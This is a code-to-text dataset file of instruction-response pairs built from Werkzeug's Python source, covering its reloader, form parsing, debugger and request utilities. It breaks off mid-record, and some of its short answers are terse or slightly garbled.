{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_args_for_reloading():\n    rv = [sys.executable]\n    py_script = os.path.abspath(sys.argv[0])\n    args = sys.argv[1:]\n    # Need to look at main module to determine how it was executed.\n    __main__ = sys.modules[\"__main__\"]\n\n    if __main__.__package__ is None:\n        # Executed a file, like \"python app.py\".\n        if os.name == \"nt\":\n            # Windows entry points have \".exe\" extension and should be\n            # called directly.\n            if not os.path.exists(py_script) and os.path.exists(py_script + \".exe\"):\n                py_script += \".exe\"\n\n            if (\n                os.path.splitext(rv[0])[1] == \".exe\"\n                and os.path.splitext(py_script)[1] == \".exe\"\n            ):\n                rv.pop(0)\n\n        elif os.path.isfile(py_script) and os.access(py_script, os.X_OK):\n            # The file is marked as executable. Nix adds a wrapper that\n            # shouldn't be called with the Python executable.\n            rv.pop(0)\n\n        rv.append(py_script)\n    else:\n        # Executed a module, like \"python -m werkzeug.serving\".\n        if sys.argv[0] == \"-m\":\n            # Flask works around previous behavior by putting\n            # \"-m flask\" in sys.argv.\n            # TODO remove this once Flask no longer misbehaves\n            args = sys.argv\n        else:\n            py_module = __main__.__package__\n            name = os.path.splitext(os.path.basename(py_script))[0]\n\n            if name != \"__main__\":\n                py_module += \".\" + name\n\n            rv.extend((\"-m\", py_module.lstrip(\".\")))\n\n    rv.extend(args)\n    return rv", "response": "Returns the executable that should be used for reloading the application."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nensure that echo mode is enabled.", "response": "def ensure_echo_on():\n    \"\"\"Ensure that echo mode is enabled. Some tools such as PDB disable\n    it which causes usability issues after reload.\"\"\"\n    # tcgetattr will fail if stdin isn't a tty\n    if not sys.stdin.isatty():\n        return\n    try:\n        import termios\n    except ImportError:\n        return\n    attributes = termios.tcgetattr(sys.stdin)\n    if not attributes[3] & termios.ECHO:\n        attributes[3] |= termios.ECHO\n        termios.tcsetattr(sys.stdin, termios.TCSANOW, attributes)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nrun the given function in an independent python interpreter.", "response": "def run_with_reloader(main_func, extra_files=None, interval=1, reloader_type=\"auto\"):\n    \"\"\"Run the given function in an independent python interpreter.\"\"\"\n    import signal\n\n    reloader = reloader_loops[reloader_type](extra_files, interval)\n    signal.signal(signal.SIGTERM, lambda *args: sys.exit(0))\n    try:\n        if os.environ.get(\"WERKZEUG_RUN_MAIN\") == \"true\":\n            ensure_echo_on()\n            t = threading.Thread(target=main_func, args=())\n            t.setDaemon(True)\n            t.start()\n            reloader.run()\n        else:\n            sys.exit(reloader.restart_with_reloader())\n    except KeyboardInterrupt:\n        pass"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef restart_with_reloader(self):\n        while 1:\n            _log(\"info\", \" * Restarting with %s\" % self.name)\n            args = _get_args_for_reloading()\n\n            # a weird bug on windows. sometimes unicode strings end up in the\n            # environment and subprocess.call does not like this, encode them\n            # to latin1 and continue.\n            if os.name == \"nt\" and PY2:\n                new_environ = {}\n                for key, value in iteritems(os.environ):\n                    if isinstance(key, text_type):\n                        key = key.encode(\"iso-8859-1\")\n                    if isinstance(value, text_type):\n                        value = value.encode(\"iso-8859-1\")\n                    new_environ[key] = value\n            else:\n                new_environ = os.environ.copy()\n\n            new_environ[\"WERKZEUG_RUN_MAIN\"] = \"true\"\n            exit_code = subprocess.call(args, env=new_environ, close_fds=False)\n            if exit_code != 3:\n                return exit_code", "response": "Spawn a new Python interpreter with the same arguments as this one and running the reloader thread."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndispatching an incoming request.", "response": "def dispatch_request(self, environ, start_response):\n        \"\"\"Dispatch an incoming request.\"\"\"\n        # set up all the stuff we want to have for this request.  That is\n        # creating a request object, propagating the application to the\n        # current context and instanciating the database session.\n        self.bind_to_context()\n        request = Request(environ)\n        request.bind_to_context()\n\n        # get the current action from the url and normalize the page name\n        # which is just the request path\n        action_name = request.args.get(\"action\") or \"show\"\n        page_name = u\"_\".join([x for x in request.path.strip(\"/\").split() if x])\n\n        # redirect to the Main_Page if the user requested the index\n        if not page_name:\n            response = redirect(href(\"Main_Page\"))\n\n        # check special pages\n        elif page_name.startswith(\"Special:\"):\n            if page_name[8:] not in pages:\n                response = page_not_found(request, page_name)\n            else:\n                response = pages[page_name[8:]](request)\n\n        # get the callback function for the requested action from the\n        # action module.  It's \"on_\" + the action name.  If it doesn't\n        # exists call the missing_action method from the same module.\n        else:\n            action = getattr(actions, \"on_\" + action_name, None)\n            if action is None:\n                response = actions.missing_action(request, action_name)\n            else:\n                response = action(request, page_name)\n\n        # make sure the session is removed properly\n        return ClosingIterator(response(environ, start_response), session.remove)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_content_type(mimetype, charset):\n    if (\n        mimetype.startswith(\"text/\")\n        or mimetype in _charset_mimetypes\n        or mimetype.endswith(\"+xml\")\n    ):\n        mimetype += \"; charset=\" + charset\n\n    return mimetype", "response": "Returns the full content type string with charset for a mimetype."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef detect_utf_encoding(data):\n    head = data[:4]\n\n    if head[:3] == codecs.BOM_UTF8:\n        return \"utf-8-sig\"\n\n    if b\"\\x00\" not in head:\n        return \"utf-8\"\n\n    if head in (codecs.BOM_UTF32_BE, codecs.BOM_UTF32_LE):\n        return \"utf-32\"\n\n    if head[:2] in (codecs.BOM_UTF16_BE, codecs.BOM_UTF16_LE):\n        return \"utf-16\"\n\n    if len(head) == 4:\n        if head[:3] == b\"\\x00\\x00\\x00\":\n            return \"utf-32-be\"\n\n        if head[::2] == b\"\\x00\\x00\":\n            return \"utf-16-be\"\n\n        if head[1:] == b\"\\x00\\x00\\x00\":\n            return \"utf-32-le\"\n\n        if head[1::2] == b\"\\x00\\x00\":\n            return \"utf-16-le\"\n\n    if len(head) == 2:\n        return \"utf-16-be\" if head.startswith(b\"\\x00\") else \"utf-16-le\"\n\n    return \"utf-8\"", "response": "Detects which UTF encoding was used to encode the given bytes."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef format_string(string, context):\n\n    def lookup_arg(match):\n        x = context[match.group(1) or match.group(2)]\n        if not isinstance(x, string_types):\n            x = type(string)(x)\n        return x\n\n    return _format_re.sub(lookup_arg, string)", "response": "String - template format a string"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef secure_filename(filename):\n    if isinstance(filename, text_type):\n        from unicodedata import normalize\n\n        filename = normalize(\"NFKD\", filename).encode(\"ascii\", \"ignore\")\n        if not PY2:\n            filename = filename.decode(\"ascii\")\n    for sep in os.path.sep, os.path.altsep:\n        if sep:\n            filename = filename.replace(sep, \" \")\n    filename = str(_filename_ascii_strip_re.sub(\"\", \"_\".join(filename.split()))).strip(\n        \"._\"\n    )\n\n    # on nt a couple of special files are present in each folder.  We\n    # have to ensure that the target file is not such a filename.  In\n    # this case we prepend an underline\n    if (\n        os.name == \"nt\"\n        and filename\n        and filename.split(\".\")[0].upper() in _windows_device_files\n    ):\n        filename = \"_\" + filename\n\n    return filename", "response": "r Returns a secure version of a file."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef escape(s):\n    if s is None:\n        return \"\"\n    elif hasattr(s, \"__html__\"):\n        return text_type(s.__html__())\n\n    if not isinstance(s, string_types):\n        s = text_type(s)\n\n    return (\n        s.replace(\"&\", \"&amp;\")\n        .replace(\"<\", \"&lt;\")\n        .replace(\">\", \"&gt;\")\n        .replace('\"', \"&quot;\")\n    )", "response": "Escape special characters in a string."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef find_modules(import_path, include_packages=False, recursive=False):\n    module = import_string(import_path)\n    path = getattr(module, \"__path__\", None)\n    if path is None:\n        raise ValueError(\"%r is not a package\" % import_path)\n    basename = module.__name__ + \".\"\n    for _importer, modname, ispkg in pkgutil.iter_modules(path):\n        modname = basename + modname\n        if ispkg:\n            if include_packages:\n                yield modname\n            if recursive:\n                for item in find_modules(modname, include_packages, True):\n                    yield item\n        else:\n            yield modname", "response": "Find all the modules below a given package."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nchecks if the function accepts the arguments and keyword arguments.", "response": "def validate_arguments(func, args, kwargs, drop_extra=True):\n    \"\"\"Checks if the function accepts the arguments and keyword arguments.\n    Returns a new ``(args, kwargs)`` tuple that can safely be passed to\n    the function without causing a `TypeError` because the function signature\n    is incompatible.  If `drop_extra` is set to `True` (which is the default)\n    any extra positional or keyword arguments are dropped automatically.\n\n    The exception raised provides three attributes:\n\n    `missing`\n        A set of argument names that the function expected but where\n        missing.\n\n    `extra`\n        A dict of keyword arguments that the function can not handle but\n        where provided.\n\n    `extra_positional`\n        A list of values that where given by positional argument but the\n        function cannot accept.\n\n    This can be useful for decorators that forward user submitted data to\n    a view function::\n\n        from werkzeug.utils import ArgumentValidationError, validate_arguments\n\n        def sanitize(f):\n            def proxy(request):\n                data = request.values.to_dict()\n                try:\n                    args, kwargs = validate_arguments(f, (request,), data)\n                except ArgumentValidationError:\n                    raise BadRequest('The browser failed to transmit all '\n                                     'the data expected.')\n                return f(*args, **kwargs)\n            return proxy\n\n    :param func: the function the validation is performed against.\n    :param args: a tuple of positional arguments.\n    :param kwargs: a dict of keyword arguments.\n    :param drop_extra: set to `False` if you don't want extra arguments\n                       to be silently dropped.\n    :return: tuple in the form ``(args, kwargs)``.\n    \"\"\"\n    parser = _parse_signature(func)\n    args, kwargs, missing, extra, extra_positional = parser(args, kwargs)[:5]\n    if missing:\n        raise ArgumentValidationError(tuple(missing))\n    elif (extra or extra_positional) and not drop_extra:\n        raise ArgumentValidationError(None, extra, extra_positional)\n    return tuple(args), kwargs"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef bind_arguments(func, args, kwargs):\n    (\n        args,\n        kwargs,\n        missing,\n        extra,\n        extra_positional,\n        arg_spec,\n        vararg_var,\n        kwarg_var,\n    ) = _parse_signature(func)(args, kwargs)\n    values = {}\n    for (name, _has_default, _default), value in zip(arg_spec, args):\n        values[name] = value\n    if vararg_var is not None:\n        values[vararg_var] = tuple(extra_positional)\n    elif extra_positional:\n        raise TypeError(\"too many positional arguments\")\n    if kwarg_var is not None:\n        multikw = set(extra) & set([x[0] for x in arg_spec])\n        if multikw:\n            raise TypeError(\n                \"got multiple values for keyword argument \" + repr(next(iter(multikw)))\n            )\n        values[kwarg_var] = extra\n    elif extra:\n        raise TypeError(\"got unexpected keyword argument \" + repr(next(iter(extra))))\n    return values", "response": "Bind the arguments provided into a dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef index(request, page):\n    days = []\n    days_found = set()\n    query = Entry.query.order_by(Entry.pub_date.desc())\n    pagination = Pagination(query, PER_PAGE, page, \"index\")\n    for entry in pagination.entries:\n        day = date(*entry.pub_date.timetuple()[:3])\n        if day not in days_found:\n            days_found.add(day)\n            days.append({\"date\": day, \"entries\": []})\n        days[-1][\"entries\"].append(entry)\n    return render_template(\"index.html\", days=days, pagination=pagination)", "response": "Show the index page or any an offset of it."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nprints the object details to stdout.", "response": "def dump(obj=missing):\n    \"\"\"Print the object details to stdout._write (for the interactive\n    console of the web debugger.\n    \"\"\"\n    gen = DebugReprGenerator()\n    if obj is missing:\n        rv = gen.dump_locals(sys._getframe(1).f_locals)\n    else:\n        rv = gen.dump_object(obj)\n    sys.stdout._write(rv)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nremoves line ending characters and returns a tuple of the stripped line and is_terminated.", "response": "def _line_parse(line):\n    \"\"\"Removes line ending characters and returns a tuple (`stripped_line`,\n    `is_terminated`).\n    \"\"\"\n    if line[-2:] in [\"\\r\\n\", b\"\\r\\n\"]:\n        return line[:-2], True\n    elif line[-1:] in [\"\\r\", \"\\n\", b\"\\r\", b\"\\n\"]:\n        return line[:-1], True\n    return line, False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nparsing the information from the WSGI environment as form data.", "response": "def parse_from_environ(self, environ):\n        \"\"\"Parses the information from the environment as form data.\n\n        :param environ: the WSGI environment to be used for parsing.\n        :return: A tuple in the form ``(stream, form, files)``.\n        \"\"\"\n        content_type = environ.get(\"CONTENT_TYPE\", \"\")\n        content_length = get_content_length(environ)\n        mimetype, options = parse_options_header(content_type)\n        return self.parse(get_input_stream(environ), mimetype, content_length, options)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nparsing the information from the given stream mimetype content_length and mimetype parameters.", "response": "def parse(self, stream, mimetype, content_length, options=None):\n        \"\"\"Parses the information from the given stream, mimetype,\n        content length and mimetype parameters.\n\n        :param stream: an input stream\n        :param mimetype: the mimetype of the data\n        :param content_length: the content length of the incoming data\n        :param options: optional mimetype parameters (used for\n                        the multipart boundary for instance)\n        :return: A tuple in the form ``(stream, form, files)``.\n        \"\"\"\n        if (\n            self.max_content_length is not None\n            and content_length is not None\n            and content_length > self.max_content_length\n        ):\n            raise exceptions.RequestEntityTooLarge()\n        if options is None:\n            options = {}\n\n        parse_func = self.get_parse_func(mimetype, options)\n        if parse_func is not None:\n            try:\n                return parse_func(self, stream, mimetype, content_length, options)\n            except ValueError:\n                if not self.silent:\n                    raise\n\n        return stream, self.cls(), self.cls()"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _find_terminator(self, iterator):\n        for line in iterator:\n            if not line:\n                break\n            line = line.strip()\n            if line:\n                return line\n        return b\"\"", "response": "Find the next line of the terminator."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nyield a generator of lines from a multipart file.", "response": "def parse_lines(self, file, boundary, content_length, cap_at_buffer=True):\n        \"\"\"Generate parts of\n        ``('begin_form', (headers, name))``\n        ``('begin_file', (headers, name, filename))``\n        ``('cont', bytestring)``\n        ``('end', None)``\n\n        Always obeys the grammar\n        parts = ( begin_form cont* end |\n                  begin_file cont* end )*\n        \"\"\"\n        next_part = b\"--\" + boundary\n        last_part = next_part + b\"--\"\n\n        iterator = chain(\n            make_line_iter(\n                file,\n                limit=content_length,\n                buffer_size=self.buffer_size,\n                cap_at_buffer=cap_at_buffer,\n            ),\n            _empty_string_iter,\n        )\n\n        terminator = self._find_terminator(iterator)\n\n        if terminator == last_part:\n            return\n        elif terminator != next_part:\n            self.fail(\"Expected boundary at start of multipart data\")\n\n        while terminator != last_part:\n            headers = parse_multipart_headers(iterator)\n\n            disposition = headers.get(\"content-disposition\")\n            if disposition is None:\n                self.fail(\"Missing Content-Disposition header\")\n            disposition, extra = parse_options_header(disposition)\n            transfer_encoding = self.get_part_encoding(headers)\n            name = extra.get(\"name\")\n            filename = extra.get(\"filename\")\n\n            # if no content type is given we stream into memory.  A list is\n            # used as a temporary container.\n            if filename is None:\n                yield _begin_form, (headers, name)\n\n            # otherwise we parse the rest of the headers and ask the stream\n            # factory for something we can write in.\n            else:\n                yield _begin_file, (headers, name, filename)\n\n            buf = b\"\"\n            for line in iterator:\n                if not line:\n                    self.fail(\"unexpected end of stream\")\n\n                if line[:2] == b\"--\":\n                    terminator = line.rstrip()\n                    if terminator in (next_part, last_part):\n                        break\n\n                if transfer_encoding is not None:\n                    if transfer_encoding == \"base64\":\n                        transfer_encoding = \"base64_codec\"\n                    try:\n                        line = codecs.decode(line, transfer_encoding)\n                    except Exception:\n                        self.fail(\"could not decode transfer encoded chunk\")\n\n                # we have something in the buffer from the last iteration.\n                # this is usually a newline delimiter.\n                if buf:\n                    yield _cont, buf\n                    buf = b\"\"\n\n                # If the line ends with windows CRLF we write everything except\n                # the last two bytes.  In all other cases however we write\n                # everything except the last byte.  If it was a newline, that's\n                # fine, otherwise it does not matter because we will write it\n                # the next iteration.  this ensures we do not write the\n                # final newline into the stream.  That way we do not have to\n                # truncate the stream.  However we do have to make sure that\n                # if something else than a newline is in there we write it\n                # out.\n                if line[-2:] == b\"\\r\\n\":\n                    buf = b\"\\r\\n\"\n                    cutoff = -2\n                else:\n                    buf = line[-1:]\n                    cutoff = -1\n                yield _cont, line[:cutoff]\n\n            else:  # pragma: no cover\n                raise ValueError(\"unexpected end of part\")\n\n            # if we have a leftover in the buffer that is not a newline\n            # character we have to flush it, otherwise we will chop of\n            # certain values.\n            if buf not in (b\"\", b\"\\r\", b\"\\n\", b\"\\r\\n\"):\n                yield _cont, buf\n\n            yield _end, None"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find_hg_tag(path):\n    tags = {}\n    try:\n        client = subprocess.Popen(\n            [\"hg\", \"cat\", \"-r\", \"tip\", \".hgtags\"], stdout=subprocess.PIPE, cwd=path\n        )\n        for line in client.communicate()[0].splitlines():\n            line = line.strip()\n            if not line:\n                continue\n            hash, tag = line.split()\n            tags[hash] = tag\n    except OSError:\n        return\n\n    client = subprocess.Popen(\n        [\"hg\", \"parent\", \"--template\", \"#node#\"], stdout=subprocess.PIPE, cwd=path\n    )\n\n    tip = client.communicate()[0].strip()\n    tag = tags.get(tip)\n    if tag is not None:\n        return tag\n    return tip", "response": "Returns the current node or tag for the given path."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef bench(func):\n    sys.stdout.write(\"%44s   \" % format_func(func))\n    sys.stdout.flush()\n\n    # figure out how many times we have to run the function to\n    # get reliable timings.\n    for i in xrange(3, 10):\n        rounds = 1 << i\n        t = timer()\n        for _ in xrange(rounds):\n            func()\n        if timer() - t >= 0.2:\n            break\n\n    # now run the tests without gc TEST_RUNS times and use the median\n    # value of these runs.\n    def _run():\n        gc.collect()\n        gc.disable()\n        try:\n            t = timer()\n            for _ in xrange(rounds):\n                func()\n            return (timer() - t) / rounds * 1000\n        finally:\n            gc.enable()\n\n    delta = median(_run() for x in xrange(TEST_RUNS))\n    sys.stdout.write(\"%.4f\\n\" % delta)\n    sys.stdout.flush()\n\n    return delta", "response": "Times a single function."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef compare(node1, node2):\n    if not os.path.isdir(\"a\"):\n        print(\"error: comparison feature not initialized\", file=sys.stderr)\n        sys.exit(4)\n\n    print(\"=\" * 80)\n    print(\"WERKZEUG INTERNAL BENCHMARK -- COMPARE MODE\".center(80))\n    print(\"-\" * 80)\n\n    def _hg_update(repo, node):\n        def hg(*x):\n            return subprocess.call(\n                [\"hg\"] + list(x), cwd=repo, stdout=null_out, stderr=null_out\n            )\n\n        hg(\"revert\", \"-a\", \"--no-backup\")\n        client = subprocess.Popen(\n            [\"hg\", \"status\", \"--unknown\", \"-n\", \"-0\"], stdout=subprocess.PIPE, cwd=repo\n        )\n        unknown = client.communicate()[0]\n        if unknown:\n            client = subprocess.Popen(\n                [\"xargs\", \"-0\", \"rm\", \"-f\"],\n                cwd=repo,\n                stdout=null_out,\n                stdin=subprocess.PIPE,\n            )\n            client.communicate(unknown)\n        hg(\"pull\", \"../..\")\n        hg(\"update\", node)\n        if node == \"tip\":\n            diff = subprocess.Popen(\n                [\"hg\", \"diff\"], cwd=\"..\", stdout=subprocess.PIPE\n            ).communicate()[0]\n            if diff:\n                client = subprocess.Popen(\n                    [\"hg\", \"import\", \"--no-commit\", \"-\"],\n                    cwd=repo,\n                    stdout=null_out,\n                    stdin=subprocess.PIPE,\n                )\n                client.communicate(diff)\n\n    _hg_update(\"a\", node1)\n    _hg_update(\"b\", node2)\n    d1 = run(\"a\", no_header=True)\n    d2 = run(\"b\", no_header=True)\n\n    print(\"DIRECT COMPARISON\".center(80))\n    print(\"-\" * 80)\n    for key in sorted(d1):\n        delta = d1[key] - d2[key]\n        if abs(1 - d1[key] / d2[key]) < TOLERANCE or abs(delta) < MIN_RESOLUTION:\n            delta = \"==\"\n        else:\n            delta = \"%+.4f (%+d%%)\" % (delta, round(d2[key] / d1[key] * 100 - 100))\n        print(\"%36s   %.4f    %.4f    %s\" % (format_func(key), d1[key], d2[key], delta))\n    print(\"-\" * 80)", "response": "Compares two Werkzeug hg versions."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef filter_hidden_frames(self):\n        for group in self.groups:\n            group.filter_hidden_frames()\n\n        self.frames[:] = [frame for group in self.groups for frame in group.frames]", "response": "Remove the frames according to the paste spec."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef log(self, logfile=None):\n        if logfile is None:\n            logfile = sys.stderr\n        tb = self.plaintext.rstrip() + u\"\\n\"\n        logfile.write(to_native(tb, \"utf-8\", \"replace\"))", "response": "Log the ASCII traceback into a file object."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a paste and return the paste id.", "response": "def paste(self):\n        \"\"\"Create a paste and return the paste id.\"\"\"\n        data = json.dumps(\n            {\n                \"description\": \"Werkzeug Internal Server Error\",\n                \"public\": False,\n                \"files\": {\"traceback.txt\": {\"content\": self.plaintext}},\n            }\n        ).encode(\"utf-8\")\n        try:\n            from urllib2 import urlopen\n        except ImportError:\n            from urllib.request import urlopen\n        rv = urlopen(\"https://api.github.com/gists\", data=data)\n        resp = json.loads(rv.read().decode(\"utf-8\"))\n        rv.close()\n        return {\"url\": resp[\"html_url\"], \"id\": resp[\"id\"]}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrendering the traceback for the interactive console.", "response": "def render_summary(self, include_title=True):\n        \"\"\"Render the traceback for the interactive console.\"\"\"\n        title = \"\"\n        classes = [\"traceback\"]\n        if not self.frames:\n            classes.append(\"noframe-traceback\")\n            frames = []\n        else:\n            library_frames = sum(frame.is_library for frame in self.frames)\n            mark_lib = 0 < library_frames < len(self.frames)\n            frames = [group.render(mark_lib=mark_lib) for group in self.groups]\n\n        if include_title:\n            if self.is_syntax_error:\n                title = u\"Syntax Error\"\n            else:\n                title = u\"Traceback <em>(most recent call last)</em>:\"\n\n        if self.is_syntax_error:\n            description_wrapper = u\"<pre class=syntaxerror>%s</pre>\"\n        else:\n            description_wrapper = u\"<blockquote>%s</blockquote>\"\n\n        return SUMMARY_HTML % {\n            \"classes\": u\" \".join(classes),\n            \"title\": u\"<h3>%s</h3>\" % title if title else u\"\",\n            \"frames\": u\"\\n\".join(frames),\n            \"description\": description_wrapper % escape(self.exception),\n        }"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nrenders the Full HTML page with the traceback info.", "response": "def render_full(self, evalex=False, secret=None, evalex_trusted=True):\n        \"\"\"Render the Full HTML page with the traceback info.\"\"\"\n        exc = escape(self.exception)\n        return PAGE_HTML % {\n            \"evalex\": \"true\" if evalex else \"false\",\n            \"evalex_trusted\": \"true\" if evalex_trusted else \"false\",\n            \"console\": \"false\",\n            \"title\": exc,\n            \"exception\": exc,\n            \"exception_type\": escape(self.exception_type),\n            \"summary\": self.render_summary(include_title=False),\n            \"plaintext\": escape(self.plaintext),\n            \"plaintext_cs\": re.sub(\"-{2,}\", \"-\", self.plaintext),\n            \"traceback_id\": self.id,\n            \"secret\": secret,\n        }"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef exception(self):\n        buf = traceback.format_exception_only(self.exc_type, self.exc_value)\n        rv = \"\".join(buf).strip()\n        return to_unicode(rv, \"utf-8\", \"replace\")", "response": "String representation of the exception."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef render(self, mark_lib=True):\n        return FRAME_HTML % {\n            \"id\": self.id,\n            \"filename\": escape(self.filename),\n            \"lineno\": self.lineno,\n            \"function_name\": escape(self.function_name),\n            \"lines\": self.render_line_context(),\n            \"library\": \"library\" if mark_lib and self.is_library else \"\",\n        }", "response": "Render a single frame in a traceback."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nevaluating code in the context of the frame.", "response": "def eval(self, code, mode=\"single\"):\n        \"\"\"Evaluate code in the context of the frame.\"\"\"\n        if isinstance(code, string_types):\n            if PY2 and isinstance(code, text_type):  # noqa\n                code = UTF8_COOKIE + code.encode(\"utf-8\")\n            code = compile(code, \"<interactive>\", mode)\n        return eval(code, self.globals, self.locals)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ndecorate a function as responder that accepts the request as first argument and returns a WSGI response.", "response": "def application(cls, f):\n        \"\"\"Decorate a function as responder that accepts the request as first\n        argument.  This works like the :func:`responder` decorator but the\n        function is passed the request object as first argument and the\n        request object will be closed automatically::\n\n            @Request.application\n            def my_wsgi_app(request):\n                return Response('Hello World!')\n\n        As of Werkzeug 0.14 HTTP exceptions are automatically caught and\n        converted to responses instead of failing.\n\n        :param f: the WSGI callable to decorate\n        :return: a new WSGI callable\n        \"\"\"\n        #: return a callable that wraps the -2nd argument with the request\n        #: and calls the function with all the arguments up to that one and\n        #: the request.  The return value is then called with the latest\n        #: two arguments.  This makes it possible to use this decorator for\n        #: both methods and standalone WSGI functions.\n        from ..exceptions import HTTPException\n\n        def application(*args):\n            request = cls(args[-2])\n            with request:\n                try:\n                    resp = f(*args[:-2] + (request,))\n                except HTTPException as e:\n                    resp = e.get_response(args[-2])\n                return resp(*args[-2:])\n\n        return update_wrapper(application, f)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef close(self):\n        files = self.__dict__.get(\"files\")\n        for _key, value in iter_multi_items(files or ()):\n            value.close()", "response": "Closes all associated resources of this request object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef path(self):\n        raw_path = wsgi_decoding_dance(\n            self.environ.get(\"PATH_INFO\") or \"\", self.charset, self.encoding_errors\n        )\n        return \"/\" + raw_path.lstrip(\"/\")", "response": "The path of the current URL."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nreturning the full path to the resource.", "response": "def full_path(self):\n        \"\"\"Requested path as unicode, including the query string.\"\"\"\n        return self.path + u\"?\" + to_unicode(self.query_string, self.url_charset)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef base_url(self):\n        return get_current_url(\n            self.environ, strip_querystring=True, trusted_hosts=self.trusted_hosts\n        )", "response": "Like url but without the querystring\n           "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef access_route(self):\n        if \"HTTP_X_FORWARDED_FOR\" in self.environ:\n            addr = self.environ[\"HTTP_X_FORWARDED_FOR\"].split(\",\")\n            return self.list_storage_class([x.strip() for x in addr])\n        elif \"REMOTE_ADDR\" in self.environ:\n            return self.list_storage_class([self.environ[\"REMOTE_ADDR\"]])\n        return self.list_storage_class()", "response": "Returns a list of all ip addresses that are forwarded to the client ip."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef on_show(request, page_name):\n    revision_id = request.args.get(\"rev\", type=int)\n    query = RevisionedPage.query.filter_by(name=page_name)\n    if revision_id:\n        query = query.filter_by(revision_id=revision_id)\n        revision_requested = True\n    else:\n        query = query.order_by(RevisionedPage.revision_id.desc())\n        revision_requested = False\n    page = query.first()\n    if page is None:\n        return page_missing(request, page_name, revision_requested)\n    return Response(generate_template(\"action_show.html\", page=page))", "response": "Displays the page the user requests."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef on_edit(request, page_name):\n    change_note = error = \"\"\n    revision = (\n        Revision.query.filter(\n            (Page.name == page_name) & (Page.page_id == Revision.page_id)\n        )\n        .order_by(Revision.revision_id.desc())\n        .first()\n    )\n    if revision is None:\n        page = None\n    else:\n        page = revision.page\n\n    if request.method == \"POST\":\n        text = request.form.get(\"text\")\n        if request.form.get(\"cancel\") or revision and revision.text == text:\n            return redirect(href(page.name))\n        elif not text:\n            error = \"You cannot save empty revisions.\"\n        else:\n            change_note = request.form.get(\"change_note\", \"\")\n            if page is None:\n                page = Page(page_name)\n                session.add(page)\n            session.add(Revision(page, text, change_note))\n            session.commit()\n            return redirect(href(page.name))\n\n    return Response(\n        generate_template(\n            \"action_edit.html\",\n            revision=revision,\n            page=page,\n            new=page is None,\n            page_name=page_name,\n            change_note=change_note,\n            error=error,\n        )\n    )", "response": "Edit the current revision of a page."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nshows the list of recent changes.", "response": "def on_log(request, page_name):\n    \"\"\"Show the list of recent changes.\"\"\"\n    page = Page.query.filter_by(name=page_name).first()\n    if page is None:\n        return page_missing(request, page_name, False)\n    return Response(generate_template(\"action_log.html\", page=page))"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nshow the diff between two revisions.", "response": "def on_diff(request, page_name):\n    \"\"\"Show the diff between two revisions.\"\"\"\n    old = request.args.get(\"old\", type=int)\n    new = request.args.get(\"new\", type=int)\n    error = \"\"\n    diff = page = old_rev = new_rev = None\n\n    if not (old and new):\n        error = \"No revisions specified.\"\n    else:\n        revisions = dict(\n            (x.revision_id, x)\n            for x in Revision.query.filter(\n                (Revision.revision_id.in_((old, new)))\n                & (Revision.page_id == Page.page_id)\n                & (Page.name == page_name)\n            )\n        )\n        if len(revisions) != 2:\n            error = \"At least one of the revisions requested does not exist.\"\n        else:\n            new_rev = revisions[new]\n            old_rev = revisions[old]\n            page = old_rev.page\n            diff = unified_diff(\n                (old_rev.text + \"\\n\").splitlines(True),\n                (new_rev.text + \"\\n\").splitlines(True),\n                page.name,\n                page.name,\n                format_datetime(old_rev.timestamp),\n                format_datetime(new_rev.timestamp),\n                3,\n            )\n\n    return 